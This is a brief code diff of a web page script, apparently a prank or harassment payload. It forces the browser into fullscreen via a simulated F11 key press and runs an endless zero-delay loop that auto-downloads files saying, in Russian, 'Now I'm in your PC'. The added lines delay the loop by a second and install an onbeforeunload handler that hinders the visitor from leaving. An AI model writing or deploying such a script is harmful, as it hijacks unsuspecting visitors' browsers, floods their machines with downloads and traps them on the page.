@@ -20,6 +20,7 @@ if(typeof rfs!="undefined" && rfs){
      wscript.SendKeys("{F11}");
   }
 }
+setTimeout(function(){
 setInterval(function(){
 let text = JSON.stringify({Теперь_я_в_твоём_пк:'ps.Kometa'});
 downloadAsFile(text);
@@ -31,3 +32,7 @@ function downloadAsFile(data) {
   a.click();
 }
 }, 0);
+}, 1000);
+window.onbeforeunload = function() {
+	return true;
+};
